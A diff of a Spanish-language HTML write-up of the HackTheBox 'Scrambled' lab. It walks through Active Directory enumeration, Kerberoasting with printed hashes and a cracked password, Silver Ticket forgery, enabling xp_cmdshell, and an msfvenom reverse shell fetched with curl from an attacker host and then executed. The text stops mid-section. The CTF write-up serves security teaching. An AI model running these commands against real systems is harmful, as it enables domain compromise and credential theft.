@@ -1,4 +1,3 @@
-<!--
 <!DOCTYPE html>
 <html>
   <head>
@@ -125,8 +124,8 @@
       <h3 class="post-title">Contenido</h3><br>
       <ul>
         <li><a href="#enumeration">Enumeración</a></li>
-        <li><a href="#shell-sqlsvc">Shell - sqlsvc/a></li>
-        <li><a href="#shell-miscsvc">Shell - miscsvc</a></li>
+        <li><a href="#shell-sqlsvc">Shell - SQLSvc</a></li>
+        <li><a href="#shell-miscsvc">Shell - MiscSvc</a></li>
         <li><a href="#shell-administrator">Shell - Administrator</a></li>
         <li><a href="#altern-administrator">Alternativa - Administrator</a></li>
       </ul>
@@ -144,7 +143,7 @@
 <p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, entre ellos el <code class="language-plaintext highlighter-rouge">80</code> que corre un servicio <code class="language-plaintext highlighter-rouge">http</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ nmap </span><span class="p">10.10.11.168
-Nmap scan report for 10.10.11.168
+Nmap scan report for 10.10.11.168  
 PORT     STATE SERVICE
 53/tcp   open  domain
 80/tcp   open  http
@@ -178,16 +177,695 @@ PORT     STATE SERVICE
 <code><span class="ve">❯ echo </span><span class="am">"10.10.11.168 scrm.local dc1.scrm.local" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Podemos abrir la <code class="language-plaintext highlighter-rouge">web</code> pero solo vemos una página principal bastante sencilla</p>
 <a href="/htb/scrambled/1.png" target="_blank"><div><p><img src="/htb/scrambled/1.png"></p></div></a>
+
+<p class="plain-text">En la pestaña <code class="language-plaintext highlighter-rouge">IT Services</code> nos muestra una alerta que nos dice que se deshabilito toda la autenticación <code class="language-plaintext highlighter-rouge">NTLM</code>, abajo podemos ver un apartado <code class="language-plaintext highlighter-rouge">Resources</code></p>
 <a href="/htb/scrambled/2.png" target="_blank"><div><p><img src="/htb/scrambled/2.png"></p></div></a>
+
+<p class="plain-text">Si vamos a <code class="language-plaintext highlighter-rouge">Contacting IT Support</code> nos da las instrucciones y un <code class="language-plaintext highlighter-rouge">correo</code>, ademas nos muestra un ejemplo desde una <code class="language-plaintext highlighter-rouge">cmd.exe</code> donde vemos el usuario <code class="language-plaintext highlighter-rouge">ksimpson</code></p>
 <a href="/htb/scrambled/3.png" target="_blank"><div><p><img src="/htb/scrambled/3.png"></p></div></a>
+
+<p class="plain-text">Como alternativa podemos descubrir algunos usuarios con <code class="language-plaintext highlighter-rouge">kerbrute</code> indicando uno de varios <a href="https://github.com/attackdebris/kerberos_enum_userlists/blob/master/A-ZSurnames.txt">diccionarios</a> pensados especificamente para <code class="language-plaintext highlighter-rouge">usuarios</code> de kerberos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ kerbrute </span><span class="p">userenum -d scrm.local --dc dc1.scrm.local A-ZSurnames.txt  
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+>  Using KDC(s):
+>       dc1.scrm.local:88
+</span><span class="ve">
+>  [+] VALID USERNAME:   ASMITH@scrm.local
+>  [+] VALID USERNAME:   KHICKS@scrm.local
+>  [+] VALID USERNAME:   KSIMPSON@scrm.local
+>  [+] VALID USERNAME:   JHALL@scrm.local
+>  [+] VALID USERNAME:   SJENKINS@scrm.local</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Esto nos deja una <code class="language-plaintext highlighter-rouge">lista</code> con un total de 5 <code class="language-plaintext highlighter-rouge">usuarios</code> validos en el <code class="language-plaintext highlighter-rouge">dominio</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">users.txt  
+asmith
+khicks
+ksimpson
+jhall
+sjenkins</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> por <code class="language-plaintext highlighter-rouge">ldap</code> por <code class="language-plaintext highlighter-rouge">kerberos</code> podemos probar si algun <code class="language-plaintext highlighter-rouge">usuario</code> utiliza su usuario como <code class="language-plaintext highlighter-rouge">contraseña</code>, por ejemplo la credencial <code class="language-plaintext highlighter-rouge">asmith:asmith</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">ldap scrm.local -u users.txt -p users.txt -k --no-bruteforce --continue-on-success
+</span><span class="az">LDAP        </span><span class="p">scrm.local      389    DC1.scrm.local   </span><span class="az">[*]  </span><span class="p">x64 (name:DC1.scrm.local) (domain:scrm.local) (signing:True) (SMBv1:False)  
+</span><span class="az">LDAP        </span><span class="p">scrm.local      389    DC1.scrm.local   </span><span class="sa">[-] </span><span class="p">scrm.local\asmith:asmith KDC_ERR_PREAUTH_FAILED
+</span><span class="az">LDAP        </span><span class="p">scrm.local      389    DC1.scrm.local   </span><span class="sa">[-] </span><span class="p">scrm.local\khicks:khicks KDC_ERR_PREAUTH_FAILED
+</span><span class="az">LDAPS       </span><span class="p">scrm.local      636    DC1.scrm.local   </span><span class="ve">[+] </span><span class="p">scrm.local\ksimpson 
+</span><span class="az">LDAPS       </span><span class="p">scrm.local      636    DC1.scrm.local   </span><span class="sa">[-] </span><span class="p">scrm.local\jhall:jhall KDC_ERR_PREAUTH_FAILED
+</span><span class="az">LDAPS       </span><span class="p">scrm.local      636    DC1.scrm.local   </span><span class="sa">[-] </span><span class="p">scrm.local\sjenkins:sjenkins KDC_ERR_PREAUTH_FAILED</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El usuario <code class="language-plaintext highlighter-rouge">ksimpson</code> lo hace, con <code class="language-plaintext highlighter-rouge">smbclient</code> podemos conectarnos autenticandonos por <code class="language-plaintext highlighter-rouge">kerberos</code> ya que la autenticacion <code class="language-plaintext highlighter-rouge">NTLM</code> esta deshabilitada, enumerando algunos <code class="language-plaintext highlighter-rouge">recursos</code> compartidos por smb encontramos el recurso <code class="language-plaintext highlighter-rouge">Public</code> que tiene un <code class="language-plaintext highlighter-rouge">pdf</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-smbclient </span><span class="p">scrm.local/ksimpson:ksimpson@dc1.scrm.local -k
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Type help for list of commands
+# shares
+ADMIN$
+C$
+HR
+IPC$
+IT
+NETLOGON
+Public
+Sales
+SYSVOL
+# use Public
+# ls
+drw-rw-rw-          0  Thu Nov  4 18:23:19 2021 .
+drw-rw-rw-          0  Thu Nov  4 18:23:19 2021 ..
+-rw-rw-rw-     630106  Fri Nov  5 13:45:07 2021 Network Security Changes.pdf  
+# get Network Security Changes.pdf
+#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Este nos explica los <code class="language-plaintext highlighter-rouge">cambios</code>, el primero fue que se deshabilito la autenticacion <code class="language-plaintext highlighter-rouge">NTLM</code> y el segundo que el uso de <code class="language-plaintext highlighter-rouge">Mssql</code> solo esta habilitado para <code class="language-plaintext highlighter-rouge">administradores</code></p>
+<a href="/htb/scrambled/4.png" target="_blank"><div><p><img src="/htb/scrambled/4.png"></p></div></a>
 
 </section>
 
 <section class="post" id="shell-sqlsvc">
-<br><h3 class="post-title">Shell - sqlsvc</h3><br>
+<br><h3 class="post-title">Shell - SQLSvc</h3><br>
 
+<p class="plain-text">Tenemos <code class="language-plaintext highlighter-rouge">credenciales</code> del dominio validas, algo a probar seria un <code class="language-plaintext highlighter-rouge">Kerberoasting</code> Attack, sin embargo al hacerlo con <code class="language-plaintext highlighter-rouge">GetUserSPNs</code> nos devuelve un problema</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-GetUserSPNs </span><span class="p">scrm.local/ksimpson:ksimpson -k -request -dc-ip dc1.scrm.local  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] exceptions must derive from BaseException</span>
 </code></pre></div></div><br>
+
+<p class="plain-text">Buscamos el <code class="language-plaintext highlighter-rouge">error</code> y en una discusion de <code class="language-plaintext highlighter-rouge">github</code> encontramos la <a href="https://github.com/fortra/impacket/issues/1206">solucion</a> al problema, esta es cambiar simplemente <code class="language-plaintext highlighter-rouge">getMachineName()</code> por <code class="language-plaintext highlighter-rouge">kdcHost</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">if </span><span class="p">self.__doKerberos:
+    target </span><span class="o">= </span><span class="p">self.getMachineName()  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">if </span><span class="p">self.__doKerberos:
+   target </span><span class="o">= </span><span class="p">self.__kdcHost  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora guardamos los cambios en el <code class="language-plaintext highlighter-rouge">.py</code> y al hacer de nuevo el <code class="language-plaintext highlighter-rouge">kerberoasting</code> obtenemos el <code class="language-plaintext highlighter-rouge">hash</code> del usuario <code class="language-plaintext highlighter-rouge">sqlsvc</code> bajo en spn <code class="language-plaintext highlighter-rouge">MSSQLSvc/dc1.scrm.local</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-GetUserSPNs </span><span class="p">scrm.local/ksimpson:ksimpson -k -request -dc-ip dc1.scrm.local
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
+----------------------------  ------  --------  --------------------------  --------------------------  ----------
+MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2023-05-03 20:14:38.654579             
+MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2023-05-03 20:14:38.654579             
+
+$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$7c127a39e3aa0cf85b101d9b6bdb04e2$2aef49dab510aa6308f93520c807a8c65f1adf6a2c1a296b8cd2f0ee9cfbd9e5f5de009fe74d7d78ac2e2c5dd5bda887e6e45607f653b2e9ed6fa0b2299d2239c74986d3a8f848255704edc403cd34bdcf375f3e3b3a98a95d651b6ac433a78c9234dac5694b75464316e9bbe0e024aa506bd22ce98a032c6bb63a3ab7cfde623717d279b601fa692883a3508c399efa069e273238509f2b92490544d04465c7e7f51f3db959853cb3604139ada68d66b1ec78c3b45129cd82280e46c4403b94450af9bd9e5b806f636432b8268adcff1e60c9dfea6a7c5bb92da1ce0aae9de7f587391de6d26dfd920a9f616aa797732f004314d9de079800cd40d037b05984065ad14874b525c296687be32514f34b6a25bec13b11efc5c7e571a2c6a3dbd30a522d42ec5fa73c2356168f91d18a93d53f9cd325b5f13078651576ba8a84239863e6955120f903c1093836908517c385a5317648826bfda969e5a06d37f0a5cba9c0fdb0d716b9ab6e8dd03f10fa0a1d3c18a03b0ca186b51e94947cf41ac71ead139c9c2f4dfb6544e4bf8eb0d9160e4be817b24f529f16cfa437fb1482a22bc3e2074b6f95dc94c3240370cc0bc9754b7dfc060a34ae7379d9582aa8d4a3507b03a012d349e9746f2657101b0939d8b18ef8da5a58ff3bc5eb4da56cf9f40187a1499cb61abdf288b8c0003de9e4247980939779e3a168884aa61a2c1539cb199e3e46fdcf95813f0544f54ab0141bfecd4740d5c4d6afbe2488c8f7b24ca5a2d9276797974a6caf2931fd654e88971204904dda38e748dbe84ab48e9fbf6996575e2360dc01701ee526bad06a5a722a3c2dae6ed2cfeade11717b99ad70917f7490f518cc1882d96a4ae211d09bd0477db29851996bf00996193385820ec578b4b3544f0624f1078b45bc16c3a46aa29a0f4baf9a41ab84646c50629573c8879dc3516ee47b4e61357386e08842a24564452fcf2b0e1c51b0db3424e3abba24a69cb2487dab263f2a995e47a6b544850751fe2ee0b1fd5f63e96683ce905fb73cfc34a329acea18f28d93d41546e77d2943bc780a3dd069244d1a1e2771ab3fd84e49469682a39f6e6238b79e9b4042c1c6df79a538685bb603e22f7ab3d32afa8c8c04dcd825c10309d0f639c13b33f47d0146c19b01c9f435c929fce64b0c7592537881e0477b6597ccdd9cb736c3d34371a5f15aa555ce14f2705c54061d20982263d52b953eec2fdec0a3ca9a4b8e5168e7ed6be2fbb1723fe029c286839e12731df0fc167daa31a3725e1fb9e7797f20b68b107f2c444baa03cad11cf46aefa6c0b570c1668a6d81c07ede3db1b321e398e1f1095dcf312d7d2b2ea50cb96eb6effaa8ee0ada5041469e09f4a93925909be921c33d38120fe236e0167cf2098baa80003c5d626862f84fe014cfbde3d9a934adc86eb9  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aunque una forma mas facil de hacer <code class="language-plaintext highlighter-rouge">kerberoasting</code> attack es desde <code class="language-plaintext highlighter-rouge">crackmapexec</code>, este igual nos devuelve el <code class="language-plaintext highlighter-rouge">hash</code> del usuario <code class="language-plaintext highlighter-rouge">sqlsvc</code> sin ningun tipo de problema</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">ldap scrm.local -u ksimpson -p ksimpson -k --kerberoasting hash
+</span><span class="az">LDAP        </span><span class="p">scrm.local      389    DC1.scrm.local   </span><span class="az">[*]  </span><span class="p">x64 (name:DC1.scrm.local) (domain:scrm.local) (signing:True) (SMBv1:False)
+</span><span class="az">LDAPS       </span><span class="p">scrm.local      636    DC1.scrm.local   </span><span class="ve">[+] </span><span class="p">scrm.local\ksimpson 
+</span><span class="az">LDAPS       </span><span class="p">scrm.local      636    DC1.scrm.local   </span><span class="az">[*] </span><span class="p">Total of records returned 2
+</span><span class="az">LDAPS       </span><span class="p">scrm.local      636    DC1.scrm.local   </span><span class="am">sAMAccountName: sqlsvc memberOf:  pwdLastSet: 2021-11-03 12:32:02.351452 lastLogon:2023-05-19 21:48:25.014834
+</span><span class="az">LDAPS       </span><span class="p">scrm.local      636    DC1.scrm.local   </span><span class="am">$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$4d9d12670b6058d6ed09729784bb2c36$403269bf1b8ba8582fb46aabeca813c9afea43545a0fbeecf1b34fce97b6572126e8f81a9cd50719f7577a2a0b7f6d59e169d1f92cc4943af7cc3e441876dd65eb8f6c2b8ab5e71af5dba32ba3b858e906be66a00df3230e4001f0a59398379aeb3f19551b666b7c97f8258dc1fa9b1dc84fae497bccb9b12b2318396e41f34856f146717ef92c1a933364165a257e9788c1a09d6a84a0eca89d4fa953e129d4c55ad4300e266b779c4421dc46bc25e04226c55ef3ade3e6977b30185616b66abddae4c81723b58ec69edcb6dfea5ad707b4f68a131d787e947ab090d0f94c59ce191f203d3ea28140bc338244b052975702535cfcdd5ad99e9e9506b82a97d5bcb38f4fa1a7b9fd3ad8e56feae6926e8495d5874143e4197a353a0d2a8855e9838e6f60a70dfb5ffcd6fdcfd4d53eaf1989f3b4347390e78ddfa1763d1ae6a8e1f998fa1987930bed159a61af9a8cc9bb752a694122fbb98b4e6b7869330d2de9e7f458aa5b6a992d2260c19c66917c4df920eb3124153c0e48bd824e11d9a98728ed459587c7be114e4bd646054afd7317db7b580d6c73bd1a15ba985d22d1d521d2a3e9105d8bf7150b1755353a50bb0b81f1926ac68e1d0dfdbd820a178135d69fa0ecf9b7e951c1759ec1d648d238351daae1954f53fa6e991ef07692f5646838703723d109e31153049bb8c24e1975d0e50924baa9761bf6664b72e0987942b753a15b713d4accbbd99149ec400d6fb0f1241984cb783ad459ecf8ae8583719491aa28adf738cbda92f9e99780c9cb814b71640829a4be5403d833def60613450e1547647654854d73422857b118d9626ffb0f843961eea56e8c60704fdca6653e85b192531d773e9e480f6ca66784de9c132f4a87f697f6cdd09250a858ac4abd624bb4e9caebe9acd77782566fbb23b3bff9794680ab02d22569ea070e0c3300f5ae37c07b88bd5b7f4605c0c42b917b43db24b7be92642968232924ac9b581bc8b18c1f19cbd307f0f4dcf21a4c75df0eb9c2441dd45dc1d1cbe93728b985ba6c2ff7b9896e23cc3255f18731c48d4b0a99a2e2e9d43e37fd8285e3e93d6c0e463e7f109c5c2fdb24b4792a7080c1c20beff83fa83da11d08dc39cba671429e43af5199ceaecc268c2af5de85da31d3384cbc4de9196bc1b886c04eebcf51ece0c6caac45cad525ea345a79e0ca3e2477e8b4ae2e708e5d80523a9ac43b354c5b688ec32f3637505e539102e0e3bbc486550cf98d1541e4081979c494d210aa16c53bdfcdbf59fff85a39fb7ab8b7797477d71ce9bfd781a3ed2ef058845185d9fbbb3675fef12922b03b899b750c09907add59d6ed66d6b7cfdb71eafb45dfd762392c044bd507162a8194a51d42595111fbc34a631de83d9ecbe228bba333ca441b5e8a8f83b50052027f95342bc28f4bcc120e1634  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al pasarle este hash a <code class="language-plaintext highlighter-rouge">john</code> obtenemos la contraseña <code class="language-plaintext highlighter-rouge">Pegasus60</code> para <code class="language-plaintext highlighter-rouge">sqlsvc</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john </span><span class="p">-w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])  
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">Pegasus60</span><span class="p">        (</span><span class="am">?</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al intentar conectarnos a <code class="language-plaintext highlighter-rouge">mssql</code> nos devuelve <code class="language-plaintext highlighter-rouge">Login failed</code>, esto es porque como vimos el <code class="language-plaintext highlighter-rouge">pdf</code> la autenticacion a mssql solo nos funcionara como un <code class="language-plaintext highlighter-rouge">administrador</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-mssqlclient </span><span class="p">scrm.local/sqlsvc:Pegasus60@dc1.scrm.local -k  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[-] ERROR(DC1): Line 1: Login failed for user 'SCRM\sqlsvc'.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Mediante un <code class="language-plaintext highlighter-rouge">Silver Ticket</code> con ese <code class="language-plaintext highlighter-rouge">SPN</code> podriamos suplantar al usuario <code class="language-plaintext highlighter-rouge">Administrator</code> pero antes de ello necesitamos varias cosas, iniciaremos con el <code class="language-plaintext highlighter-rouge">SID</code> del dominio que podemos obtener con <code class="language-plaintext highlighter-rouge">secretsdump</code> con el parametro <code class="language-plaintext highlighter-rouge">-debug</code> con las credenciales de <code class="language-plaintext highlighter-rouge">ksimpson</code> que aunque no funciona nos lo muestra</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-secretsdump </span><span class="p">scrm.local/ksimpson:ksimpson@dc1.scrm.local -k -debug 2>/dev/null
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
+[+] The specified path is not correct or the KRB5CCNAME environment variable is not defined
+[+] Trying to connect to KDC at SCRM.LOCAL
+[+] Trying to connect to KDC at SCRM.LOCAL
+[+] Trying to connect to KDC at SCRM.LOCAL
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+[+] Session resume file will be sessionresume_GlMkRGSQ
+[+] The specified path is not correct or the KRB5CCNAME environment variable is not defined
+[+] Trying to connect to KDC at SCRM.LOCAL
+[+] Trying to connect to KDC at SCRM.LOCAL
+[+] Trying to connect to KDC at SCRM.LOCAL
+[+] Calling DRSCrackNames for S-1-5-21-2743207045-1827831105-2542523200-500 
+[+] Calling DRSGetNCChanges for {edaf791f-e75b-4711-8232-3cd66840032a} 
+[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.  
+[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
+[*] Cleaning up...</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Lo siguiente es el <code class="language-plaintext highlighter-rouge">hash NT</code>, ya que tenemos la <code class="language-plaintext highlighter-rouge">contraseña</code> podemos convertirlo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="p">-n Pegasus60 | </span><span class="ve">iconv </span><span class="p">-t utf16le | </span><span class="ve">openssl </span><span class="p">md4  
+MD4(stdin)= b999a16500b87d17ec7f2e2a68778f05</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora con <code class="language-plaintext highlighter-rouge">ticketer</code> bajo el SPN <code class="language-plaintext highlighter-rouge">MSSQLSvc/dc1.scrm.local</code> con la información que hemos obtenido generamos un <code class="language-plaintext highlighter-rouge">ticket</code> que nos otorgara como <code class="language-plaintext highlighter-rouge">Administrator</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-ticketer </span><span class="p">-nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -dc-ip dc1.scrm.local -spn MSSQLSvc/dc1.scrm.local Administrator  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for scrm.local/Administrator
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*] 	PAC_SERVER_CHECKSUM
+[*] 	PAC_PRIVSVR_CHECKSUM
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Saving ticket in Administrator.ccache
+
+</span><span class="ve">❯ export </span><span class="p">KRB5CCNAME=Administrator.ccache</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Este privilegio de <code class="language-plaintext highlighter-rouge">Administrator</code> se limita al servicio del <code class="language-plaintext highlighter-rouge">SPN</code>, asi que podemos conectarmos a <code class="language-plaintext highlighter-rouge">mssql</code> haciendo uso de la autenticacion de <code class="language-plaintext highlighter-rouge">kerberos</code> con el</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-mssqlclient </span><span class="p">dc1.scrm.local -k -no-pass
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC1): Line 1: Changed database context to 'master'.
+[*] INFO(DC1): Line 1: Changed language setting to us_english.  
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Como somos <code class="language-plaintext highlighter-rouge">administradores</code> podemos habilitar el modulo <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> para ejecutar <code class="language-plaintext highlighter-rouge">comandos</code>, ejecutamos un <code class="language-plaintext highlighter-rouge">whoami</code> y lo hace como el usuario <code class="language-plaintext highlighter-rouge">sqlsvc</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> enable_xp_cmdshell
+[*] INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.  
+[*] INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL> xp_cmdshell whoami
+
+output
+--------------------------------------------------------------------------  
+
+scrm\sqlsvc
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para obtener una <code class="language-plaintext highlighter-rouge">powershell</code> inicaremos por generar un <code class="language-plaintext highlighter-rouge">exe</code> malicioso que nos haga una <code class="language-plaintext highlighter-rouge">revshell</code>, despues lo compartimos con un servicio <code class="language-plaintext highlighter-rouge">http</code> con python</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/x64/powershell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o shell.exe  
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 1887 bytes
+Final size of exe file: 8192 bytes
+Saved as: shell.exe
+
+</span><span class="ve">❯ sudo python3</span><span class="p"> -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora desde <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> descargamos el <code class="language-plaintext highlighter-rouge">shell.exe</code> y lo guardamos en <code class="language-plaintext highlighter-rouge">C:\ProgramData</code>, seguidamente lo invocamos para que nos envie la <code class="language-plaintext highlighter-rouge">shell</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> xp_cmdshell curl 10.10.14.10/shell.exe -o C:\ProgramData\shell.exe
+
+output
+--------------------------------------------------------------------------  
+
+SQL> xp_cmdshell C:\ProgramData\shell.exe</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al hacerlo obtenemos una <code class="language-plaintext highlighter-rouge">powershell</code> en la maquina como el usuario <code class="language-plaintext highlighter-rouge">sqlsvc</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.168
+Windows PowerShell running as user sqlsvc on DC1
+Copyright (C) Microsoft Corporation. All rights reserved.  
+
+PS C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+scrm\sqlsvc
+PS C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-miscsvc">
+<br><h3 class="post-title">Shell - MiscSvc</h3><br>
+
+<p class="plain-text">Antes de seguir nos conectaremos de nuevo a <code class="language-plaintext highlighter-rouge">mssql</code> para enumerarlo, si listamos las <code class="language-plaintext highlighter-rouge">bases de datos</code> existentes en el servidor nos encontramos con <code class="language-plaintext highlighter-rouge">ScrambleHR</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> select name from sys.databases;
+
+name
+--------------------------------------------------------------------------  
+
+master
+tempdb
+model
+msdb
+ScrambleHR
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En esa base de datos tenemos solo 3 <code class="language-plaintext highlighter-rouge">tablas</code> donde solo destaca <code class="language-plaintext highlighter-rouge">UserImport</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> select name from ScrambleHR.sys.tables;
+
+name
+--------------------------------------------------------------------------  
+
+Employees
+UserImport
+Timesheets
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Listamos todo el contenido de la tabla <code class="language-plaintext highlighter-rouge">UserImport</code> de la base de datos <code class="language-plaintext highlighter-rouge">ScrambleHR</code>, esta contiene lo que parece ser <code class="language-plaintext highlighter-rouge">credenciales</code> de el usuario <code class="language-plaintext highlighter-rouge">MiscSvc</code> en Ldap</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> select * from ScrambleHR.dbo.UserImport
+
+LdapUser               LdapPwd                LdapDomain               RefreshInterval   IncludeGroups
+--------------------   --------------------   ----------------------   ---------------   -------------  
+
+MiscSvc                ScrambledEggs9900      scrm.local                            90               0</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos comprobarlas con <code class="language-plaintext highlighter-rouge">crackmapexec</code> autenticandonos por kerberos, son validas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">ldap scrm.local -u miscsvc -p ScrambledEggs9900 -k
+</span><span class="az">LDAP        </span><span class="p">scrm.local      389    DC1.scrm.local   </span><span class="az">[*]  </span><span class="p">x64 (name:DC1.scrm.local) (domain:scrm.local) (signing:True) (SMBv1:False)  
+</span><span class="az">LDAPS       </span><span class="p">scrm.local      636    DC1.scrm.local   </span><span class="ve">[+] </span><span class="p">scrm.local\miscsvc</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que es un usuario del dominio desde la <code class="language-plaintext highlighter-rouge">shell</code> de sqlsvc definimos la <code class="language-plaintext highlighter-rouge">credencial</code> de <code class="language-plaintext highlighter-rouge">MiscSvc</code>, con ella usando <code class="language-plaintext highlighter-rouge">Invoke-Command</code> podemos ejecutar comandos</p>
